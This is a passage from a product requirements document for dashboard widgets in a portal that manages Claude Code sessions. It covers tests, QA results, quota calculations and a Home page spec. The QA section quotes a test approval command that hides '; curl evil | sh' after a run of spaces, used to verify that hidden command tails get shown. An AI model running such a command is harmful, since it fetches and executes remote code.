| `widgets/shared/steady.test.ts` | A list held while it is used: not engaged it is the list as it is; engaged, rows keep their order, one that left stays as `gone`, a new one goes to the end or waits (a tree); a gone row that returns takes its place; letting go takes the fresh order; with rows a, b, c, d and the person on d, a to c answered elsewhere and e new, d is still the fourth row. |
| `widgets/sessions/model.test.ts` | Running 3, waiting 1, open 8: amber, "3", "Sessions: 3 running and 1 waiting for you, 8 open"; none running is grey; 120 is `99+`; loading, failed and unreadable; a row's second line says what a waiting session asks; the dot by state. |
| `widgets/agents/model.test.ts` | 4 running and 1 waiting is amber and "4"; a task row says its type and how long (4 minutes, "<1m"); what Stop does on each kind of row and that a waiting worker has none. |
| `widgets/attention/model.test.ts` | 2 requests, 1 ticket and 1 failed run make 4, red, count 4; tickets alone are amber; 150 requests read `99+` while the badge count is 150; an unreadable source is named and not added, three unreadable is "-" with no count; Allow is offered only for a tool request with its whole text; **the widget and the session's card agree on six requests** (whole, hidden tail, cut, none, empty, an MCP tool's JSON) and on the one line saying why. |
| `widgets/shortcuts/keys.test.ts` | Ctrl+K off a Mac, Cmd+K on one, no other modifier, not while composing or already handled, never in the terminal; the label per platform. |
| `widgets/shortcuts/search.test.ts` | The scores 120, 100, 60, 30, 10 and 0, words adding up (160), the order and the tie rules, at most six of a kind and twelve in all, nothing typed, a ticket number. |
| `widgets/shortcuts/items.test.ts` | Archived sessions left out and an ended one kept, a session found by its Claude, branch and ticket, a workspace opens its shell while it runs, a ticket from the portal's search, the pages, the actions keeping the rest of the address and replacing an old `glance` parameter. |
| `chat/approvalReview.test.ts` | A block that fits has been read, one that overflows has been read at its end (two pixels of slack, a pixel of overflow is rounding); Allow only for text that is there and whole and, when it overflows, only once read to its end; Deny always; the hidden-tail command wraps over more than the block and starts unread. |

Looked at in Chromium (headless, a scratch portal) on 2026-10-12, at 390, 800 and 1280 px, light and dark, in two ways.

1. **Fixtures** (the usage snapshot and the session's socket stubbed, expected values worked out by hand before looking): Atlas, Opus week 62 %, so the chip reads 38 % and is ok; Borealis, session 96 %, so 4 % and critical, speed 6 points an hour, so 96 + 6 × 1 = 102 % at the reset and it runs out in (100 − 96) ÷ 6 h = 40 min, "over quota"; Echo, 85 %, so 15 % and warn; a pool, the icon alone; a signed-out Claude, "-" and a hollow dot. ✅ the header strip on the phone bar and the sidebar (rail and wide), the popover from the list, the sidebar and the composer line, the bottom sheet, the dock as a rail and as a panel, the Settings section, `?new=1` and `?glance=quota` (the dialog opens, the query goes), Escape and a tap outside close the popover and focus returns to the chip, the dot shapes enlarged.
2. **The real server** (`GET /api/claude-usage` from the tree after [Claude usage](claude-usage.md) §20 landed: a scratch portal with probes off, a real Docker workspace with four Claudes, readings written straight into the usage tables, so the portal computed the pace itself). Hand-computed readings: Default session 10, 15, 20 % at −60, −30 and 0 min, resetting in 3 h of 5: speed 10 points an hour, projected 20 + 10 × 3 = 50 % ("under quota"), even pace 40 %. Default week 50, 60, 70 % at −10, −5 and 0 h, resetting in 20 h: speed 2, projected 70 + 2 × 20 = 110 % ("over quota"), runs out in (100 − 70) ÷ 2 = 15 h, span 10 h under a tenth of the window so "few readings". Opus 45 % with one reading: speed, projection and status unavailable with `single_sample`. Delta session 90, 92, 94, 96 % at −45 to 0 min, resetting in 1 h: speed 8, 96 + 8 × 1 = 104 %, runs out in 4 ÷ 8 h = 30 min. ✅ The portal's answers equalled those numbers to the digit, and the widget drew them: the chip "30 %" with the warn diamond and "projected to run out before the reset (est.)" in its title (Default is ok by percent, warn by projection); the full form's Speed "+2 pts/h est.", Pace "110 % at reset est. over quota", "Runs out 20:26 (in 14 h 59 m)", and "-" with "Needs a second reading in this period." for Opus; a signed-out Claude "Not signed in", an API key "No plan limits"; all-Claudes mode leads with Delta (4 %, critical); a reading aged two hours dims the chip, shows "2 h ago" and turns Speed and Pace into "-" with the portal's reason `stale`; the app badge with a spy on `navigator.setAppBadge` and the Needs attention widget fed 2 approvals, 1 ticket and 1 failed CI run: the icon was set to 4.

The other widgets were looked at on 2026-10-12 in Chromium against **a real Claude Code 2.1.296**: a scratch portal with This machine switched on, a clean environment (`env -i`, a scratch home, no account), and the model replaced by a scripted stand-in for the Messages API with a fake key. Three real sessions asked for approvals (`touch …`, `npm test`, a six-line command with a 150-space run before `; curl evil \| sh`) and one ran a sub-agent that the stand-in held; the rest were written straight into the tables the portal reads (two workers of the sub-agent session, a request cut at the cap, one with no text, a failed CI run) and two tickets were made through the API. Expected values were worked out first. ✅ The chips read "Sessions: 1 running and 3 waiting for you, 5 open", "Agents: 3 running and 1 waiting for you" (the task and two workers) and "Needs attention: 4 approvals, 2 tickets and 1 failed CI run", and the app badge fed 7. ✅ **Deny** from the widget: the portal recorded `denied`, Claude Code printed "Denied by the operator." and asked for the next command, which appeared in the widget without a reload; **Allow** from the widget: `allowed_once`, the command ran (exit 254, there was no `package.json`) and the session ended its turn. ✅ **Stop** on the running task ended it and its row went. ✅ The whole text: the six-line command showed in the block with `; curl evil \| sh` in view, in the session's approval card too; the cut request offered Open to review and Deny with "Too long to show in full."; the one with no text offered the same with "Nothing to show for this request."; while the block still overflowed (at 144 px high) Allow was disabled with "Scroll to the end to allow." and turned on after the block was scrolled to its end (the block was then made 160 px high, where that command fits and Allow is on at once). ✅ The palette: Ctrl+K opens, the arrows move, Enter opens, `T-1` goes to the ticket, Ctrl+K again closes, a query with no match says so, Escape closes. ✅ Sizes, each in light and dark with the Attention full form and the palette: 390 px, phone landscape (844 × 390), 768, 1024, 1280 and 1920 px; no horizontal scroll, cut-off or overlap was seen. ✅ **Extreme data** (the snapshot answered by a fixture, QA A9): a session title, an agent name and a repository name of 200 characters with no spaces, strings of rocket and fire emoji, Arabic and Hebrew titles, depths beyond the indent, counts of 450 running and 1,300 open and 5,000 waiting. At 390 and 1280 px the three full forms had no horizontal scroll, nothing outside its dialog, and every truncated text (14, 21 and 12 of them) carried a title and a name; the chips read `99+` and the link `+1.3k more`; right-to-left titles read right to left. Not yet: the full text of a truncated title is in a native title and the link's name, which a sighted keyboard user cannot reach (the shared ClampText of A9 will replace it). ✅ **Neighbour shift**, by hand: three requests at 317, 462 and 608 px from the top with the pointer over the list; the first is answered elsewhere and a fourth arrives; the first stayed at 317 as "No longer waiting", the second and third stayed at 462 and 608, the fourth did not show; when the pointer left they moved to 317 and 462 and the fourth showed at 608 (before the list was held, the popover grew upward and all three moved up 145 px). ✅ States with the snapshot request answered by a fixture: a failed load ("Could not load." with Try again), a refusal ("Not allowed."), empty lists ("Nothing needs you.", "No agents running.", "No sessions." with New session), and a failed refresh after a good reading (the old rows stay, "May be out of date." with Refresh, and Refresh brings the new ones).

Not looked at: a real device, a real Claude account's numbers (🔬), the badge on a platform that has one (🔬), the phone's on-screen keyboard over the palette (the field follows the visual viewport as the session screen does: 🔬), the "May be out of date." line with the live socket down (the line after a failed refresh was looked at), a screen reader.

## 15. Milestones

| Milestone | Scope |
| --- | --- |
| G0 | The widget interface and registry. **Built.** |
| G1 | The frame: chips, strips, popover, sheet, composer line and list row, deep links, failure isolation. **Built** and looked at. |
| G2 | The side dock. **Built** and looked at. |
| G3 | Settings > Glance. **Built** and looked at. |
| G4 | The Quota widget. **Built**; its figures come from the snapshot, the estimates from [Claude usage](claude-usage.md) §20.2. |
| G5 | Manifest shortcuts and the app badge. **Built**; 🔬 on devices. |
| G6 | Sessions, Active agents, Needs attention, Shortcuts and the server snapshot (§10). **Built** and looked at against a real Claude Code (§14); the approval text they show is [Chat sessions](chat-sessions.md) FR25a. |

## 16. Unverified, and open questions

| ID | Question |
| --- | --- |
| Q1 | 🔬 The Badging API on real devices: the number on desktop installed apps, a dot or a number on Android, iOS needing the app's notification permission. |
| Q2 | 🔬 The manifest shortcuts on a real Android phone and desktop Chrome: whether the 192 px app icon is accepted for each shortcut and the labels fit. |
| Q3 | Settings stay on the device, per user. Should the portal keep them per user instead, so a reinstall or a second device has them? (Proposed: later, with accounts; the shape is ready.) |
| Q4 | Quota's default mode is Active. Would the owner rather start with All? |
| Q5 | The dock is off by default. On from 1536 px, where the page has room? |
| Q6 | "The Claude used most recently" reads the sessions list. The glance aggregator's snapshot already knows each session's last activity and Claude, so it could replace that read. |
| Q7 | This device's thresholds colour the chips, while the toasts keep the portal's 80 and 95. A person who changes them sees different levels in each. |
| Q8 | The approval text of the file tools is the path; what a Write puts in the file, or an Edit changes, is not part of it (the Diff panel shows that afterwards). Should the card and the widget show the first lines of the contents or a diff? |
| Q9 | A plan (ExitPlanMode) longer than 8,000 characters is cut and can only be denied. Raise the cap for plans, or show them in the transcript first? |
| Q10 | A workspace in the palette opens its shell while it runs, because the Workspaces page has no address for one workspace. A `?open=<id>` there would be better (not in this PRD's files). |
| Q11 | Needs attention's failed runs: three days, the latest non-cancelled run of a branch, a tag stands for the window. Are those the owner's rules? |
| Q12 | Agents counts workers and sub-agents, not a plain working session (that is Sessions). Would the owner rather have every running session in both? |

## 17. Amendments to other PRDs

| ID | PRD and section | Change |
| --- | --- | --- |
| A1 | [Web app & PWA](web-app-pwa.md) §10.1, FR6, W4 and its amendment A11 | Shortcuts built (New session, Sessions, Needs attention); the app badge is written by the page from the glance count, with no push. |
| A2 | README | One index line. |
| A3 | [Chat sessions](chat-sessions.md) FR22 and FR25a, the data model | What is approved is shown whole (up to 8,000 characters), Allow only for text that is there and whole and has been read, the portal refuses Allow otherwise; `chat_requests.full` and `full_cut` (migration 190). |
| A4 | Contracts | `glance.ts` (the snapshot and its limits) and the live topic `glance`; `ChatRequest.full`, `fullCut`, `REQUEST_FULL_MAX` and `requestReview` in `chat.ts`. |
| A5 | [Web app & PWA](web-app-pwa.md) §8, A9 and the new A12 | The app opens on Home (§18); Home is first in the navigation and in the phone bar, Knowledge moves to More. |

## 18. The Home page

Owner (2026-10-13, ticket T-34): a front page that shows, at a glance, the sessions that run, the quota, the workspaces, the tickets and the rest. Built on the widgets: every card of the page is the `Card` of a glance widget, so a card can also sit in the strips as a chip and the frame knows no card by name (G1).

- **Where.** `/admin/home`, first in `NAV` (a house), so the app opens on it (`HOME` is the first item: the index route, an unknown route and the sign-in's return all land there). In the phone bar it takes the first place; Knowledge moves to More so the bar stays at five ([Web app & PWA](web-app-pwa.md) G2). Workspaces, the old first page, stays in the bar.
- **Layout.** One column on a phone, two from 1024 px, three from 1700 px; cards start at the top of their row (a long card does not stretch its neighbour). A card: its icon, a title of one or two words, an ⓘ with what it shows and where it comes from, the body, and a foot link to the page behind it. Every row is a link of at least 44 px whose text truncates with the whole of it in its name and title (QA A5, A9).
- **Arrange.** One button (an icon on a phone) opens a dialog: per card a switch and a move up and a move down (44 px, no dragging), and Reset. Kept per person on the device (`localStorage` `claudepilot.home.<user>`), like the glance settings (§7), apart from them: a card hidden on Home is not hidden in the strips. Order: the person's, then the default (Needs you, Sessions, Quota, Workspaces, Tickets, CI, Usage), so a card added later shows up without a reset. All hidden: one line and Arrange. The header row is the same in Dashboard and Manager: the mode switch and the Arrange slot keep their place, and in Manager Arrange's slot stays, hidden (T-1851: the right-most button used to jump on the switch; `tools/qa/home.mjs` checks it).
- **No new polling (G3).** A card reads a shared store (`widgets/shared/liveStore.ts`, the pattern of `useGlance`): loaded on first use (not again within 15 s by a card that only mounted), again on its live topic and when the socket comes back. The glance snapshot (§10.5) carries Needs you and Sessions; `useClaudeUsage` Quota; the others read their page's list route once and on its topic (`workspaces` and `usage` push the data itself, `tickets`, `ci`, `autotransfer` and `usage` say "load again").
- **Honest numbers (G4).** A figure that could not be read is "-" or says "could not be read", never 0; an estimate says "est."; a card whose source failed says so with Try again, a refusal says "Not allowed.".

| Card | What it shows | Source |
| --- | --- | --- |
| Needs you (`attention`) | One list, most blocking first: approvals (a session is stopped on each; the longest waiting first), deploys held for approval (the oldest run first), interrupted sessions (the latest first), failed CI runs that still stand, tickets assigned to a person. Six rows, then "+N more" (the Attention full form). Answering happens where the whole text is shown (§10.6): the session or the full form. | Snapshot `attention` (new: `deploys`, runs whose job waits for approval, local-git-ci FR41) and `sessions.interrupted`; the total counts the sources that were read, the others are named. |
| Sessions | Running, Waiting, Open as figures; then the latest open sessions a person started, pinned first (T-1), each with its state ("Idle · 2 agents" while sub-agents or workers run, T-31), its Claude's colour and name, workspace, branch, last activity. All sessions. | Snapshot `sessions` (new: `recent`, `pinned`, `branch`, `agents`, `interrupted`). |
| Quota | Every Claude, the one closest to running out first and open: each window (session, week, per model) with its meter, pace and reset (the full form's block, §9.3). Order: the least left of its fullest window (measured), a tie by the sooner projected run-out, then name; Claudes without a reading follow, pools and keys last. Under them auto move: Off, Ask or Automatic, its threshold, and the last move the portal made by itself. | `GET /api/claude-usage` (claude-usage §20) and topic `claudeusage`; auto move's overview and its trail (new filter `kind=moved`), topic `autotransfer`. |
| Workspaces | Running, Stopped, Failing as figures; rows failing first (error, unreachable), then on the way up or down, running, stopped; CPU and memory for a running one where the portal measured it ("-" otherwise); a mark when its Claude Code differs from the image's pin (claude-version-pinning). | `GET /api/workspaces`, topics `workspaces` and `usage`. |
| Tickets | Open by status (open, in progress, blocked, in review), waiting for a person, unassigned (the agents' queue); the three newest open tickets. | `GET /api/tickets?sort=newest&limit=3` (new: `sort=newest`), topic `tickets`. |
| CI | Running, failing (still standing, §10.3), to approve; the five newest runs with their state. | `GET /api/ci/runs?limit=5`, topic `ci`; failing and to approve from the snapshot. |
| Usage | Today and this week (since Monday's midnight, in the portal's zone): estimated dollars ("est.", Claude Code's own price estimate), tokens and requests (counted). Terminal use of Claude Code is not recorded and not in it. | `GET /api/usage-spend` (new: `week`), topic `usage`. |

The four new widgets (Workspaces, Tickets, CI, Usage) start off in the strips (`defaultHidden`) and are switched on in Settings > Glance; the switch is then an explicit choice either way (`shown`), so a default can change later without overriding it.

Tests: the pure models (`attention/needs.test.ts`, `quota/board.test.ts`, `workspaces/model.test.ts`, `tickets/model.test.ts`, `ci/model.test.ts`, `spend/model.test.ts`, `home/settings.test.ts`, `glance/settings.test.ts`) and the snapshot's new parts on the server (`glance/build.test.ts`, `glance/authz.test.ts`). Looked at in Chromium at 390 and 1280 px, light and dark, against a scratch portal (2026-10-13).
